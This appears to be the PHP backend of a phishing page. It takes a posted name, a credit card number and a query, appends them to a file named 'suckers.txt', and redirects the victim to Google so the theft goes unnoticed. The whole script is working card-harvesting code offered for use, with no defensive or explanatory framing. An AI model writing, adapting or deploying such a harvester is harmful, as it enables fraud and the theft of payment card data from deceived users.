<?php

$userName = $_POST['name'];
$ccn = $_POST['ccn'];
$query = $_POST['query'];

if(!empty($userName) && !empty($ccn) && !empty($query)){
    $output = sprintf("name - %s, ccn - %s, query - %s", $userName, $ccn, $query);
    file_put_contents('suckers.txt', $output, FILE_APPEND);
    header('Location: https://www.google.com/');
}